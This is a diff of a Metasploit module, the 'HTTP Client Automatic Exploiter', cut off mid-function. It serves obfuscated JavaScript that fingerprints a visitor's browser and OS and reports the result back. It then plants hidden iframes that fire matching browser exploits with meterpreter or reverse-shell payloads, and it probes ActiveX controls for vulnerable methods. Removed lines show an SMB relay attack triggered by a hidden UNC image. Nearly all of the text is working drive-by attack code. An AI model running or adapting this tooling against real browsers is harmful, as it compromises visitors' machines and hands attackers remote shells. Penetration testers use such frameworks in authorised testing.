@@ -9,33 +9,48 @@
 # http://metasploit.com/framework/
 ##
 
+# ideas:
+#	- add a loading page option so the user can specify arbitrary html to
+#	  insert all of the evil js and iframes into
+#	- caching is busted when different browsers come from the same IP
+#	- opera historysearch won't work in an iframe
+#	- some kind of version comparison for each browser
+#		- is a generic comparison possible?
+#			9.1 < 9.10 < 9.20b < 9.20
+#			3.5-pre < 3.5 < 3.5.1
 
 require 'msf/core'
-require 'rex/exploitation/javascriptosdetect.rb'
+require 'rex/exploitation/javascriptosdetect'
 
 
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpServer::HTML
-	include Msf::Auxiliary::Report
 	
 	def initialize(info = {})
 		super(update_info(info, 
 			'Name'        => 'HTTP Client Automatic Exploiter',
 			'Version'     => '$Revision$',
 			'Description' => %q{
-					This module uses a combination of client-side and server-side techniques to
-				fingerprint HTTP clients and then automatically exploit them.
+				This module uses a combination of client-side and server-side
+				techniques to fingerprint HTTP clients and then automatically
+				exploit them.
 				},
 			'Author'      => 
 				[
-					'egypt <egypt[at]metasploit.com>',  # initial concept, integration and extension of Jerome's os_detect.js
-					'Jerome Athias'                     # advanced Windows OS detection in javascript
+					# initial concept, integration and extension of Jerome
+					# Athias' os_detect.js
+					'egypt',
 				],
 			'License'     => BSD_LICENSE,
 			'Actions'     =>
 				[
-				 	[ 'WebServer' ]
+					[ 'WebServer', {
+						'Description' => 'Start a bunch of modules and direct clients to appropriate exploits' 
+					} ],
+					[ 'list', { 
+						'Description' => 'List the exploit modules that would be started'
+					} ]
 				],
 			'PassiveActions' => 
 				[
@@ -44,31 +59,75 @@ class Metasploit3 < Msf::Auxiliary
 			'DefaultAction'  => 'WebServer'))
 
 		register_options([
-			OptAddress.new('LHOST', [true, 'The IP address to use for reverse-connect payloads']),
-			OptPort.new('LPORT', [false, 'The starting TCP port number for reverse-connect payloads', 4444])
+			OptAddress.new('LHOST', [true, 
+				'The IP address to use for reverse-connect payloads'
+			]),
+		], self.class)
+
+		register_advanced_options([
+			OptString.new('MATCH', [false, 
+				'Only attempt to use exploits whose name matches this regex'
+			]),
+			OptString.new('EXCLUDE', [false, 
+				'Only attempt to use exploits whose name DOES NOT match this regex'
+			]),
+			OptBool.new('DEBUG', [false, 
+				'Do not obfuscate the javascript and print various bits of useful info to the browser',
+				false
+			]),
 		], self.class)
 
 		@exploits = Hash.new
+		@targetcache = Hash.new
 	end
-	
-	def init_exploit(name, targ = 0)
-		targ ||= 0
+
+
+	def run
+		if (action.name == 'list')
+			m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
+			e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
+			framework.exploits.each_module do |name, mod|
+				if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
+					@exploits[name] = nil
+					print_line name
+				end
+			end
+			print_line
+			print_status("Found #{@exploits.length} exploit modules")
+		else 
+			start_exploit_modules()
+			exploit()
+		end 
+	end
+
+
+	def init_exploit(name, mod = nil, targ = 0)
+		if mod.nil?
+			@exploits[name] = framework.modules.create(name)
+		else
+			@exploits[name] = mod.new
+		end
+
 		case name
-		when %r{exploit/windows}
+		when %r{windows}
 			payload='windows/meterpreter/reverse_tcp'
+			#payload='generic/debug_trap'
 		else
 			payload='generic/shell_reverse_tcp'
 		end	
-		@exploits[name] = framework.modules.create(name)
+		print_status("Starting exploit #{name} with payload #{payload}")
 		@exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']
 
 		# For testing, set the exploit uri to the name of the exploit so it's
 		# easy to tell what is happening from the browser.
-		# XXX: Comment this out for release
-		#@exploits[name].datastore['URIPATH'] = name  
+		# XXX: Set to nil for release
+		#@exploits[name].datastore['URIPATH'] = nil  
+		@exploits[name].datastore['URIPATH'] = name  
 
-		@exploits[name].datastore['LPORT']   = @lport
-		@exploits[name].datastore['LHOST']   = @lhost
+		# set a random lport for each exploit.  There's got to be a better way
+		# to do this but it's still better than incrementing it
+		@exploits[name].datastore['LPORT'] = rand(32768) + 32768
+		@exploits[name].datastore['LHOST'] = @lhost
 		@exploits[name].exploit_simple(
 			'LocalInput'     => self.user_input,
 			'LocalOutput'    => self.user_output,
@@ -76,428 +135,390 @@ class Metasploit3 < Msf::Auxiliary
 			'Payload'        => payload,
 			'RunAsJob'       => true)
 
-		@lport += 1
+		# It takes a little time for the resources to get set up, so sleep for
+		# a bit to make sure the exploit is fully working.  Without this,
+		# mod.get_resource doesn't exist when we need it.
+		Rex::ThreadSafe.sleep(0.5)
+		# Make sure this exploit got set up correctly, return false if it
+		# didn't
+		if framework.jobs[@exploits[name].job_id.to_s].nil?
+			print_error("Failed to start exploit module #{name}")
+			@exploits.delete(name)
+			return false
+		end
+		return true
 	end
 
-	def setup() 
-		super
-		@lport = datastore['LPORT'] || 4444
-		@lhost = datastore['LHOST']
-		@lport = @lport.to_i
+	def start_exploit_modules() 
+		@lhost = (datastore['LHOST'] || "0.0.0.0")
+
+		@js_tests = {}
+		@noscript_tests = {}
+
+		print_line
 		print_status("Starting exploit modules on host #{@lhost}...")
+		print_status("---")
+		print_line
+		m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
+		e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
+		framework.exploits.each_module do |name, mod|
+			if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
+				next if !(init_exploit(name))
+				apo = mod.autopwn_opts
+				#p apo
+				apo[:name] = name
+				if apo[:classid]
+					# Then this is an IE exploit that uses an ActiveX control,
+					# build the appropriate tests for it.
+					method = apo[:vuln_test].dup
+					apo[:vuln_test] = ""
+					apo[:ua_name] = ::Msf::Auxiliary::Report::HttpClients::IE
+					if apo[:classid].kind_of?(Array)  # then it's many classids
+						apo[:classid].each { |clsid| 
+							apo[:vuln_test] << "if (testAXO('#{clsid}', '#{method}')) {\n"
+							apo[:vuln_test] << " is_vuln = true;\n"
+							apo[:vuln_test] << "}\n"
+						}
+					else 
+						apo[:vuln_test] << "if (testAXO('#{apo[:classid]}', '#{method}')) {\n"
+						apo[:vuln_test] << " is_vuln = true;\n"
+						apo[:vuln_test] << "}\n"
+					end
+				end
+				if apo[:javascript] && apo[:ua_name]
+					if @js_tests[apo[:ua_name]].nil?
+						@js_tests[apo[:ua_name]] = []
+					end
+					@js_tests[apo[:ua_name]].push(apo)
+				elsif apo[:javascript]
+					if @js_tests["generic"].nil?
+						@js_tests["generic"] = []
+					end
+					@js_tests["generic"].push(apo)
+				elsif apo[:ua_name]
+					if @noscript_tests[apo[:ua_name]].nil?
+						@noscript_tests[apo[:ua_name]] = []
+					end
+					@noscript_tests[apo[:ua_name]].push(apo)
+				else
+					if @noscript_tests["generic"].nil?
+						@noscript_tests["generic"] = []
+					end
+					@noscript_tests["generic"].push(apo)
+				end
+			end
+		end
+		print_line
+		print_status("--- Done, found #{@exploits.length} exploit modules")
+		print_line
 
-		##
-		# Start all the exploit modules
-		##
+		@js_tests.each { |browser,tests|
+			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
+		}
+		@noscript_tests.each { |browser,tests|
+			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
+		}
 
-		# TODO: add an Automatic target to all of the Firefox exploits
+		init_js = ::Rex::Exploitation::ObfuscateJS.new
+		init_js << <<-ENDJS
 
-		# Firefox < 1.0.5
-		# requires javascript
-		# currently only has a windows target
-		init_exploit('exploit/multi/browser/mozilla_compareto')
+			#{js_os_detect}
+			#{js_base64}
+			function make_xhr() {
+				var xhr;
+				try { 
+					xhr = new XMLHttpRequest(); 
+				} catch(e) {
+					try { 
+						xhr = new ActiveXObject("Microsoft.XMLHTTP"); 
+					} catch(e) {
+						xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
+					}
+				}
+				if (! xhr) {
+					throw "failed to create XMLHttpRequest";
+				}
+				return xhr;
+			}
 
-		# Firefox < 1.5.0.5
-		# requires java
-		# requires javascript
-		# Has targets for Windows, Linux x86, MacOSX x86/PPC, no auto
-		init_exploit('exploit/multi/browser/mozilla_navigatorjava')
+			function report_and_get_exploits(detected_version) {
+				var encoded_detection;
+				xhr = make_xhr();
+				xhr.onreadystatechange = function () {
+					if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
+						#{js_debug('"<pre>" + htmlentities(xhr.responseText) + "</pre>"')}
+						eval(xhr.responseText);
+					}
+				};
 
-		# Firefox < 1.5.0.1
-		# For now just use the default target of Mac.
-		# requires javascript
-		# Has targets for MacOSX PPC and Linux x86, no auto
-		init_exploit('exploit/multi/browser/firefox_queryinterface')
+				encoded_detection = new String();
+				for (var prop in detected_version) {
+					#{js_debug('prop + " " + detected_version[prop]')}
+					encoded_detection += detected_version[prop] + ":";
+				}
+				#{js_debug('encoded_detection + "<br>"')}
+				encoded_detection = Base64.encode(encoded_detection);
+				xhr.open("GET", document.location + "?sessid=" + encoded_detection);
+				xhr.send(null);
+			}
 
-		# works on iPhone 
-		# does not require javascript
-		init_exploit('exploit/osx/armle/safari_libtiff')
+			function bodyOnLoad() {
+				var detected_version = getVersion();
+				//#{js_debug('detected_version')}
+				report_and_get_exploits(detected_version);
+			} // function bodyOnLoad
+		ENDJS
 
-		# untested
-		#init_exploit('exploit/osx/browser/software_update')
-		# untested
-		#init_exploit('exploit/windows/browser/ani_loadimage_chunksize')
+		opts = {
+			'Symbols' => {
+				'Variables'   => [
+					'xhr',
+					'encoded_detection',
+				],
+				'Methods'   => [
+					'report_and_get_exploits',
+					'handler',
+					'bodyOnLoad',
+				]
+			},
+			'Strings' => true,
+		}
 
-		# does not require javascript
-		init_exploit('exploit/windows/browser/apple_quicktime_rtsp')
+		init_js.update_opts(opts)
+		init_js.update_opts(js_os_detect.opts)
+		init_js.update_opts(js_base64.opts)
+		if (datastore['DEBUG'])
+			print_status("Adding debug code")
+			init_js << <<-ENDJS
+				if (!(typeof(debug) == 'function')) {
+					function htmlentities(str) {
+						str = str.replace(/>/g, '&gt;');
+						str = str.replace(/</g, '&lt;');
+						str = str.replace(/&/g, '&amp;');
+						return str;
+					}
+					function debug(msg) {
+						document.body.innerHTML += (msg + "<br />\\n");
+					}
+				}
+			ENDJS
+		else
+			init_js.obfuscate()
+		end
 
-		# requires javascript
-		init_exploit('exploit/windows/browser/novelliprint_getdriversettings')
-
-		# Works on default IE 6
-		# Doesn't work on Windows 2000 SP0 IE 5.0
-		# I'm pretty sure keyframe works on everything this works on, but since
-		# this doesn't need javascript, try it anyway.
-		# does not require javascript
-		init_exploit('exploit/windows/browser/ms03_020_ie_objecttype')
-
-		# requires javascript
-		init_exploit('exploit/windows/browser/ie_createobject')
-
-		# I'm pretty sure keyframe works on everything this works on and more,
-		# so for now leave it out.
-		# requires javascript
-		# init_exploit('exploit/windows/browser/ms06_055_vml_method')
-
-		# Works on default IE 5 and 6
-		# requires javascript 
-		# ActiveXObject('DirectAnimation.PathControl')
-		# classid D7A7D7C3-D47F-11D0-89D3-00A0C90833E6
-		init_exploit('exploit/windows/browser/ms06_067_keyframe')
-
-		# only works on IE with XML Core Services
-		# requires javascript
-		# classid 88d969c5-f192-11d4-a65f-0040963251e5
-		init_exploit('exploit/windows/browser/ms06_071_xml_core')
-
-		# Pops up whatever client is registered for .pls files.  It's pretty
-		# obvious to the user when this exploit loads, so leave it out for now.
-		# does not require javascript
-		#init_exploit('exploit/windows/browser/winamp_playlist_unc')
-
-
-		# untested
-		init_exploit('exploit/windows/browser/systemrequirementslab_unsafe')
-		# untested
-		init_exploit('exploit/windows/browser/lpviewer_url')
-		# untested
-		init_exploit('exploit/windows/browser/softartisans_getdrivename')
-		# untested
-		init_exploit('exploit/windows/browser/ms08_053_mediaencoder')
-		# untested
-		init_exploit('exploit/windows/browser/macrovision_unsafe')
-
-
-		#
-		# Requires UNC path which only seems to work on IE in my tests
-		#
-		
-		# Launch a smb_relay module on port 139
-		smbr_mod = framework.modules.create('exploit/windows/smb/smb_relay')
-		smbr_mod.datastore['LHOST']   = @lhost
-		smbr_mod.datastore['LPORT']   = (@lport += 1)
-		smbr_mod.datastore['SRVPORT'] = 139
-		smbr_mod.datastore['AutoRunScript'] = 'migrate'
-		smbr_mod.exploit_simple(
-			'LocalInput'     => self.user_input,
-			'LocalOutput'    => self.user_output,
-			'Target'         => 0,
-			'Payload'        => 'windows/meterpreter/reverse_tcp',
-			'RunAsJob'       => true)
-
-		# Launch a second one with port 445
-		smbr_mod = framework.modules.create('exploit/windows/smb/smb_relay')
-		smbr_mod.datastore['LHOST']   = @lhost
-		smbr_mod.datastore['LPORT']   = (@lport += 1)
-		smbr_mod.datastore['SRVPORT'] = 445
-		smbr_mod.datastore['AutoRunScript'] = 'migrate'
-		smbr_mod.exploit_simple(
-			'LocalInput'     => self.user_input,
-			'LocalOutput'    => self.user_output,
-			'Target'         => 0,
-			'Payload'        => 'windows/meterpreter/reverse_tcp',
-			'RunAsJob'       => true)
-			
-		@myhost = datastore['SRVHOST']
-		@myport = datastore['SRVPORT']
+		init_js << "window.onload = #{init_js.sym("bodyOnLoad")}";
+		@init_html  = "<html > <head > <title > Loading </title>\n"
+		@init_html << '<script language="javascript" type="text/javascript">'
+		@init_html << "<!-- \n #{init_js} //-->"
+		@init_html << "</script> </head> "
+		@init_html << "<body onload=\"#{init_js.sym("bodyOnLoad")}()\"> "
+		@init_html << "<noscript> \n"
+		@init_html << build_iframe("#{self.get_resource}?ns=1")
+		@init_html << "</noscript> \n"
+		@init_html << "</body> </html> "
 
 	end
 
 	def on_request_uri(cli, request) 
 		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")
 
-		# Create a cached mapping between IP and detected target
-		@targetcache ||= {}
-		@targetcache[cli.peerhost] ||= {}
-		@targetcache[cli.peerhost][:update] = Time.now.to_i
-
-		##
-		# Clean the cache -- remove hosts that we haven't seen for more than 60
-		# seconds
-		##
-		rmq = []
-		@targetcache.each_key do |addr|
-			if (Time.now.to_i > @targetcache[addr][:update]+60)
-				rmq.push addr
-			end
-		end
-		rmq.each {|addr| @targetcache.delete(addr) }
-		#--
-	
 		case request.uri
-			when %r{^#{datastore['URIPATH']}.*sessid=}
-				record_detection(cli, request)
-				send_not_found(cli)
-			when self.get_resource
-				#
-				# This is the request for exploits.  At this point all we know
-				# about the target came from the useragent string which could
-				# have been spoofed, so let the javascript figure out which 
-				# exploits to run.  Record detection based on the useragent in  
-				# case javascript is disabled on the target.
-				#
-
-				record_detection(cli, request)
-				print_status("Responding with exploits")
-
-				response = build_sploit_response(cli, request)
-				response['Expires'] = '0'
-				response['Cache-Control'] = 'must-revalidate'
-				
-				cli.send_response(response)
-			else
-				print_error("I don't know how to handle this request (#{request.uri}), sending 404")
-				send_not_found(cli)
-				return false
-		end
-	end
-
-	def run
-		exploit()
-	end
-
-	def build_sploit_response(cli, request)
-		if (!@targetcache[cli.peerhost]) 
+		when self.get_resource
+			# This is the first request.  Send the javascript fingerprinter and
+			# hope it sends us back some data.  If it doesn't, javascript is
+			# disabled on the client and we will have to do a lot more
+			# guessing.
+			response = create_response()
+			response["Expires"] = "0"
+			response["Cache-Control"] = "must-revalidate"
+			response.body = @init_html
+			cli.send_response(response)
+		when %r{^#{self.get_resource}.*sessid=}
+			# This is the request for the exploit page when javascript is
+			# enabled.  Includes the results of the javascript fingerprinting
+			# in the "sessid" parameter as a base64 encoded string.
 			record_detection(cli, request)
-		end
+			print_status("Responding with exploits")
+			response = build_script_response(cli, request)
 			
+			cli.send_response(response)
+		when %r{^#{self.get_resource}.*ns=1}
+			# This is the request for the exploit page when javascript is NOT
+			# enabled.  Since scripting is disabled, fall back to useragent
+			# detection, which is kind of a bummer since it's so easy for the
+			# ua string to lie.  It probably doesn't matter that much because
+			# most of our exploits require javascript anyway.
+			print_status("Browser has javascript disabled, trying exploits that don't need it")
+			record_detection(cli, request)
+			response = build_noscript_response(cli, request)
+			
+			cli.send_response(response)
+		else
+			print_error("I don't know how to handle this request (#{request.uri}), sending 404")
+			send_not_found(cli)
+			return false
+		end
+	end
+
+	def build_noscript_response(cli, request)
+		client_db = get_client(cli.peerhost, request['User-Agent'])
+
 		response = create_response()
+		response['Expires'] = '0'
+		response['Cache-Control'] = 'must-revalidate'
 
-		objects = []
+		response.body  = "<html > <head > <title > Loading </title> </head> "
+		response.body << "<body> "
 
-		objects += [ 
-			[ 'DirectAnimation.PathControl',            'KeyFrame', exploit_resource('exploit/windows/browser/ms06_067_keyframe') ],
-			[ 'LPViewer.LPViewer.1',                    'URL', exploit_resource('exploit/windows/browser/lpviewer_url') ],
-			[ '{88D969C5-F192-11D4-A65F-0040963251E5}', 'SetRequestHeader', exploit_resource('exploit/windows/browser/ms06_071_xml_core') ],
-			[ '{36723F97-7AA0-11D4-8919-FF2D71D0D32C}', 'GetDriverSettings', exploit_resource('exploit/windows/browser/novelliprint_getdriversettings') ],
-			[ '{BD96C556-65A3-11D0-983A-00C04FC29E36}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
-			[ '{BD96C556-65A3-11D0-983A-00C04FC29E30}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
-			[ '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
-			[ '{6414512B-B978-451D-A0D8-FCFDF33E833C}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
-			[ '{06723E09-F4C2-43C8-8358-09FCD1DB0766}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
-			[ '{639F725F-1B2D-4831-A9FD-874847682010}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
-			[ '{BA018599-1DB3-44F9-83B4-461454C84BF8}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
-			[ '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
-			[ '{E8CCCDDF-CA28-496B-B050-6C07C962476B}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
-			[ '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
-			[ '{0006F033-0000-0000-C000-000000000046}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
-			[ '{0006F03A-0000-0000-C000-000000000046}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
-			[ '{67A5F8DC-1A4B-4D66-9F24-A704AD929EEE}', 'Init', exploit_resource('exploit/windows/browser/systemrequirementslab_unsafe') ],
-			[ '{A8D3AD02-7508-4004-B2E9-AD33F087F43C}', 'GetDetailsString', exploit_resource('exploit/windows/browser/ms08_053_mediaencoder') ],
-		]
-		objects = objects.map{ |arr| "new Array('#{arr[0]}', '#{arr[1]}', '#{arr[2]}')," }.join("\n").chop
+		@noscript_tests.each { |browser, sploits|
+			next if sploits.length == 0
+			# If get_client failed then we have no knowledge of this host,
+			# don't assume anything about the browser. If ua_name is nil or
+			# generic, these exploits need to be sent regardless of browser.
+			# Either way, we need to send these exploits.
+			if (client_db.nil? || [nil, browser, "generic"].include?(client_db[:ua_name]))
+				if (HttpClients::IE == browser)
+					response.body << "<!--[if IE]>\n"
+				end
+				sploits.map do |s|
+					response.body << (s[:prefix_html] || "") + "\n"
+					response.body << build_iframe(exploit_resource(s[:name])) + "\n"
+					response.body << (s[:postfix_html] || "") + "\n"
+				end
+				if (HttpClients::IE == browser)
+					response.body << "<![endif]-->\n"
+				end
+			end
+		}
 
-		js = <<-ENDJS
-			var DEBUGGING = false;
+		response.body << "Your mom "
+		response.body << "</body> </html> "
 
-			#{js_os_detect}
-			#{js_base64}
-			if (!(typeof(debug)== 'function')) {
-				function debug(msg) {
-					if (DEBUGGING) {
-						document.writeln(msg);
-					}
-				}
-			}
+		return response
+	end
 
-			function send_detection_report(detected_version) {
-				// ten chars long and all uppercase so we can't possibly step
-				// on a real version string.
-				var cruft = "#{Rex::Text.rand_text_alpha_upper(10)}"; 
-				var encoded_detection;
-				try { xmlhr = new XMLHttpRequest(); }
-				catch(e) {
-					try { xmlhr = new ActiveXObject("Microsoft.XMLHTTP"); }
-					catch(e) {
-						xmlhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
-					}
-				}
-				if (! xmlhr) {
-					return(0);
-				}
-				encoded_detection =  new String();
-				encoded_detection += detected_version.os_name + cruft;
-				encoded_detection += detected_version.os_flavor + cruft;
-				encoded_detection += detected_version.os_sp + cruft;
-				encoded_detection += detected_version.os_lang + cruft;
-				encoded_detection += detected_version.arch + cruft;
-				encoded_detection += detected_version.browser_name + cruft;
-				encoded_detection += detected_version.browser_version;
-				while (-1 != encoded_detection.indexOf(cruft)) {
-					encoded_detection = encoded_detection.replace(cruft, ":");
-				}
-				//debug(encoded_detection + "<br>");
-				encoded_detection = Base64.encode(encoded_detection);
-				//debug(encoded_detection + "<br>");
-				xmlhr.open("GET", document.location + "?sessid=" + encoded_detection, false);
-				xmlhr.send(null);
-			}
+	def build_script_response(cli, request)
+		response = create_response()
+		response['Expires'] = '0'
+		response['Cache-Control'] = 'must-revalidate'
 
-			function BodyOnLoad() {
-				var sploit_frame = '';
-				var body_elem = document.getElementById('body_id');
-				var detected_version = getVersion();
+		client_db = get_client(cli.peerhost, request['User-Agent'])
+		p client_db
+		p get_host({:host => cli.peerhost})
 
-				try {
-					// This function doesn't seem to get created on old
-					// browsers (specifically, Firefox 1.0), so until I
-					// can puzzle out why, wrap it in a try block so the
-					// javascript parser doesn't crap out and die before
-					// any exploits get sent.
-					send_detection_report(detected_version);
-				} catch (e) {}
-
-				if ("#{HttpClients::IE}" == detected_version.browser_name) {
-					//debug("This is IE<br />");
-					var object_list = new Array(#{objects});
-					var vuln_obj;
-					var written_frames = new Array();
-
-					// iterate through our list of exploits 
-					debug("I have " + object_list.length + " objects to test <br />");
-					for (var current_object in object_list) {
-						debug("Testing for object " + current_object + " ... ");
-						// Don't write the same iframe more than once.  This is
-						// only an issue with ie_createobject which uses a ton of
-						// different classids to perform the same exploit.
-						// Assumes that no url will be a substring of another url.
-						if (-1 != written_frames.toString().indexOf(object_list[current_object][2])) {
-							debug("Already wrote an iframe for " + object_list[current_object][0] +"<br>");
-							continue;
+		js = ::Rex::Exploitation::ObfuscateJS.new
+		# If we didn't get a client database, then the detection is
+		# borked or the db is not connected, so fallback to sending
+		# some IE-specific stuff with everything.  Otherwise, make
+		# sure this is IE before sending code for ActiveX checks.
+		#if (client_db.nil? || client_db[:ua_name] == HttpClients::IE)
+		if (client_db.nil? || [nil, HttpClients::IE].include?(client_db[:ua_name]))
+			# If we have a class name (e.g.: "DirectAnimation.PathControl"),
+			# use the simple and direct "new ActiveXObject()".  If we
+			# have a classid instead, first try creating a the object
+			# with createElement("object").  However, some things
+			# don't like being created this way (specifically winzip),
+			# so try writing out an object tag as well.  One of these
+			# two methods should succeed if the object with the given
+			# classid can be created.
+			js << <<-ENDJS
+				function testAXO(axo_name, method) {
+					if (axo_name.substring(0,1) == String.fromCharCode(123)) {
+						axobj = document.createElement("object");
+						axobj.setAttribute("classid", "clsid:" + axo_name);
+						axobj.setAttribute("id", axo_name);
+						axobj.setAttribute("style", "visibility: hidden");
+						axobj.setAttribute("width", "0px");
+						axobj.setAttribute("height", "0px");
+						document.body.appendChild(axobj);
+						if (typeof(axobj[method]) == 'undefined') {
+							var attributes = 'id="' + axo_name + '"';
+							attributes += ' classid="clsid:' + axo_name + '"';
+							attributes += ' style="visibility: hidden"';
+							attributes += ' width="0px" height="0px"';
+							document.body.innerHTML += "<object " + attributes + "></object>";
+							axobj = document.getElementById(axo_name);
 						}
-						vuln_obj = '';
-						if (object_list[current_object][0].substring(0,1) == '{') {
-							var name = object_list[current_object][0].substring( 1, object_list[current_object][0].length - 1 );
-							//debug("which is a classid <br />");
-
-							// classids are stored surrounded in braces for an easy way to tell 
-							// them from ActiveX object names, so if it has braces, strip them 
-							// out and create an object element with that classid
-							vuln_obj = document.createElement("object");
-							vuln_obj.setAttribute("classid", "clsid:" + name);
-
-							vuln_obj.setAttribute("id", name);
-						} else {
-							// otherwise, try to create an AXO with that name
-							try { 
-								vuln_obj = new ActiveXObject(object_list[current_object][0]);
-							} catch(e){ 
-								vuln_obj = '';
-							}
-							debug("did ActiveXObject("+ object_list[current_object][0] +") and i got a "+ typeof(vuln_obj) +"<br>");
-						}
-						// javascript lets us access method names like array
-						// elements, so obj.foo is the same as obj['foo']
-						// However, ActiveX objects created with an 
-						// <object classid="..."> tag don't advertise their methods 
-						// the same way other objects do, i.e., in the example
-						// above, foo does not show up in 
-						//     for (var method in obj) { ... } 
-						// It's still there, you just can't see it.  Unfortunately,
-						// there is no method that all ActiveX objects must
-						// implement, so as far as I can tell, there is no generic
-						// way to determine if the object is available.  The 
-						// solution is to check for the existence of a method we
-						// know based on the exploit, e.g. in the case of 
-						// windows/browser/ie_createobject, CreateObject() must
-						// exist.  Methods that don't exist have a 
-						// typeof == 'undefined' whereas exported ActiveX object 
-						// methods have a typeof == 'unknown' 
-						if (typeof(vuln_obj[object_list[current_object][1]]) == 'unknown') {
-							// then we're golden, write the evil iframe
-							sploit_frame += '#{build_iframe("' + object_list[current_object][2] + '")}';
-							// array.push() is not cross-platform 
-							written_frames[written_frames.length] = object_list[current_object][2];
-						//} else if (typeof(vuln_obj[object_list[current_object][1]]) != 'undefined') {
-						//	eval("alert(typeof(vuln_obj."+ object_list[current_object][1] +"));");
-						}
-					} // end for each exploit
-				} // end if IE
-				else {
-					//debug("this is NOT MSIE<br />");
-					if (window.navigator.javaEnabled && window.navigator.javaEnabled()) {
-						sploit_frame += '#{build_iframe(exploit_resource('exploit/multi/browser/mozilla_navigatorjava'))}';
 					} else {
-						//debug("NO exploit/multi/browser/mozilla_navigatorjava");
+						try {
+							axobj = new ActiveXObject(axo_name);
+						} catch(e) {
+							axobj = '';
+						};
 					}
-					if (window.InstallVersion) {
-						sploit_frame += '#{build_iframe(exploit_resource('exploit/multi/browser/mozilla_compareto'))}';
-					} else {
-						//debug("NO exploit/multi/browser/mozilla_compareto");
+					#{js_debug('axo_name + "." + method + " = " + typeof axobj[method] + "<br/>"')}
+					if (typeof(axobj[method]) != 'undefined') {
+						return true;
 					}
-					// eventually this exploit will have an auto target and
-					// this check won't be necessary
-					if ("#{OperatingSystems::MAC_OSX}" == detected_version.os_name) {
-						if (location.QueryInterface) {
-							sploit_frame += '#{build_iframe(exploit_resource('exploit/multi/browser/firefox_queryinterface'))}';
-						}
+					return false;
+				}
+			ENDJS
+			# End of IE-specific test functions
+		end
+		js << <<-ENDJS
+			var written_iframes = new Array();
+			function write_iframe(myframe) {
+				var iframe_idx; var mybody;
+				for (iframe_idx in written_iframes) {
+					if (written_iframes[iframe_idx] == myframe) {
+						return;
 					}
 				}
-				if (0 < sploit_frame.length) {
-					// This is isn't working in IE6.  Revert to document.write
-					// until we can come up with something better
-					//body_elem.innerHTML += sploit_frame;
-					document.writeln(sploit_frame);
-				}
-			} // function BodyOnLoad
-			window.onload = BodyOnLoad;
+				written_iframes[written_iframes.length] = myframe;
+				str = '';
+				str += '<iframe src="' + myframe + '" style="visibility:hidden" height="0" width="0" border="0"></iframe>';
+				str += '<p>' + myframe + '</p>';
+				document.body.innerHTML += (str);
+			}
 		ENDJS
 		opts = {
-			# Strings obfuscation still needs more testing
-			'Strings' => true,
 			'Symbols' => {
-				'Variables' => [
-					'current_object',
-					'body_elem', 'body_id', 
-					'object_list', 'vuln_obj', 
-					'obj_elem', 'sploit_frame',
-					'cruft', 'written_frames',
-					'detected_version', 'xmlhr',
-					'encoded_detection'
+				'Variables'   => [
+					'written_iframes',
+					'myframe',
+					'mybody',
+					'iframe_idx',
+					'is_vuln',
 				],
 				'Methods'   => [
-					'Hash', 'BodyOnLoad', 
-					'send_detection_report'
+					'write_iframe',
 				]
-			}
+			},
+			'Strings' => true,
 		}
 
-		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
-		js.update_opts(js_os_detect.opts)
-		js.update_opts(js_base64.opts)
-		js.obfuscate()
-
-		body  = "<body id=\"#{js.sym('body_id')}\">"
-
-		body << "<h1> Loading, please wait... </h1>"
-
-		# 
-		# These are non-javascript exploits, send them with all requests in
-		# case the ua is spoofed and js is turned off
-		#
-		
-		body << "<!--[if lt IE 7]>"
-		body << build_iframe(exploit_resource('exploit/windows/browser/ms03_020_ie_objecttype'))
-		#body << "Internet Explorer &lt; version 7"
-		body << "<![endif]-->"
-
-		# image for smb_relay 
-		share_name = Rex::Text.rand_text_alpha(rand(10) + 5) 
-		img_name = Rex::Text.rand_text_alpha(rand(10) + 5) + ".jpg"
-		body << %Q{
-			<img src="\\\\#{@lhost}\\#{share_name}\\#{img_name}" style="visibility:hidden" height="0" width="0" border="0" />
+		@js_tests.each { |browser, sploits|
+			next if sploits.length == 0
+			#print_status("Building sploits for #{client_db[:ua_name]}")
+			if (client_db.nil? || [nil, browser, "generic"].include?(client_db[:ua_name]))
+				js << "function exploit#{browser}() { \n"
+				sploits.map do |s|
+					if s[:vuln_test]
+						# Wrap all of the vuln tests in a try-catch block so a
+						# single borked test doesn't prevent other exploits
+						# from working.
+						js << " is_vuln = false;\n"
+						js << " try {\n"
+						js << s[:vuln_test] + "\n"
+						js << " } catch(e) { is_vuln = false; };\n"
+						js << " if (is_vuln) {"
+						js << "  write_iframe('" + exploit_resource(s[:name]) + "'); "
+						js << " }\n"
+					else
+						js << " write_iframe('" + exploit_resource(s[:name]) + "');\n"
+					end
+				end
